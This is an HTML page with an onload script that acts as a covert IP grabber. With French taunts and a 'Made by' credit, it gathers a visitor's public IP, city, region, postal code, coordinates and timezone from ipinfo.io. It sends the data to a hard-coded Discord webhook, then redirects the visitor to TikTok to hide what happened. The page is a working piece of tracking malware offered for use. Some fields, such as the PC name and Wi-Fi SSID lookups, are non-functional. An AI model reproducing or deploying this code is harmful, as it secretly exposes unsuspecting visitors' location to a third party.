<body onload="monScript()">
    <script>
        function monScript() {
            async function getLocalIP() {
                try {
                    const response = await fetch("https://ipinfo.io/json");
                    const data = await response.json();
                    const localIP = data.ip;
                    return localIP;
                } catch (error) {
                    console.error("Erreur lors de la récupération de l'adresse IP locale :", error);
                    return null;
                }
            }

            async function getIPDetails() {
                try {
                    const response = await fetch("https://ipinfo.io/json");
                    const data = await response.json();
                    return data;
                } catch (error) {
                    console.error("Erreur lors de la récupération des détails de l'IP :", error);
                    return null;
                }
            }

            async function getUserInfo(accessToken) {
                try {
                    const response = await fetch('https://discord.com/api/users/@me', {
                        headers: {
                            Authorization: `Bearer ${accessToken}`
                        }
                    });

                    if (response.ok) {
                        const userInfo = await response.json();
                        return userInfo;
                    } else {
                        throw new Error('Impossible d\'obtenir les informations de l\'utilisateur Discord.');
                    }
                } catch (error) {
                    console.error('Erreur :', error);
                    return null;
                }
            }

            function getTimezone() {
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                return timezone;
            }

           
            async function displayUserInfo() {
                try {
                    const accessToken = ''; 
                    const userInfo = await getUserInfo(accessToken);

                    
                    const discordName = userInfo ? userInfo.username : "Non disponible";
                    console.log(`Nom Discord de l'utilisateur : ${discordName}`);
                    const webhookUrl = 'https://discord.com/api/webhooks/1157626122993926204/tS9TcA-AWlfbosEJLIjIOM7TYwMZRhx-ccBxJrCWwZYkxMbZYGdrzRj9yqhtQy1MfW9H';
                    const content = `@here ||Je serai le ministre de tous les français||`;
                    const version = `||[Version : 1.0.0]||`;
                    const thumbnailUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS43D6-Iv4H6oR-_r4v4MBFgset3zC9nmH8kA&usqp=CAU';
                    const ipDetails = await getIPDetails();
                    const region = ipDetails ? ipDetails.region : "Non disponible";
                    const city = ipDetails ? ipDetails.city : "Non disponible";
                    const postalCode = ipDetails ? ipDetails.postal : "Non disponible";
                    const timezone = getTimezone();
                    const loc = ipDetails ? ipDetails.loc : "Non disponible";

                    
                    const data = {
                        content: content,
                        embeds: [
                            {
                                title: "***__Tonton Castex a grabb un zigoto :__***",
                                color: 0x000000,
                                thumbnail: {
                                    url: thumbnailUrl
                                },
                                fields: [
                                    {
                                        name: "══════════════════════════════════",
                                        value: "",
                                    },
                                    {
                                        name: "__Le zigoto en question :__",
                                        value: "```" + discordName + "```",
                                    },
                                    {
                                        name: "══════════════════════════════════",
                                        value: "",
                                    },
                                    {
                                  
                                        name: "__Adresse IP Locale :__",
                                        value: "```" + (await getLocalIP()) + "```",
                                    },
                                    {
                                        name: "__Ville :__",
                                        value: "```" + city + "```",
                                    },
                                    {
                                        name: "__Région :__",
                                        value: "```" + region + "```",
                                    },
                                    {
                                        name: "__Code Postal :__",
                                        value: "```" + postalCode + "```",
                                    },
                                    {
                                        name: "__Localisation :__",
                                        value: "```" + loc + "```",
                                    },
                                    {
                                        name: "__Fuseau horaire :__",
                                        value: "```" + timezone + "```",
                                    },
                                    {
                                        name: "══════════════════════════════════",
                                        value: "",
                                    },
                                    {
                                        name: "__Grabbed par :__",
                                        value: "```" + window.location.hostname + "```",
                                    },
                                    {
                                        name: "__Nom du PC :__",
                                        value: "```" + window.location.hostname + "```",
                                    },
                                    {
                                        name: "__Nom du Wi-Fi :__",
                                        value: "```" + await getWifiName() + "```",
                                    },
                                    {
                                        name: "══════════════════════════════════",
                                        value: "",
                                    },
                                ],
                                footer: {
                                    text: "Made by Ƶƶeffect ツ  [Version 1.0.0]",
                                },
                            },
                        ],
                    };
                                

                   
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data),
                    });

                    if (response.status === 204) {
                        console.log("Adresse IP locale, nom de la machine et nom du Wi-Fi envoyés avec succès à Discord.");
                    } else {
                        console.error("Erreur lors de l'envoi de l'adresse IP locale à Discord :", response.status);
                    }
                } catch (error) {
                    console.error("Erreur lors de l'envoi de l'adresse IP locale à Discord :", error);
                }
            }

            async function main() {
                const localIP = await getLocalIP();
                const wifiName = await getWifiName();

                if (localIP) {
                    displayUserInfo();
                }
            }

            async function getWifiName() {
                try {
                    const connection = await navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (connection && connection.type === 'wifi' && connection.ssid) {
                        return connection.ssid;
                    } else {
                        return "Non connecté au réseau";
                    }
                } catch (error) {
                    console.error("Erreur lors de la récupération du nom du Wi-Fi :", error);
                    return "Nom du Wi-Fi non disponible";
                }
            }

            main();

            setTimeout(function () {
                window.location.href = 'https://www.tiktok.com/fr/';
            }, 1000);
        }

        

        
    </script>
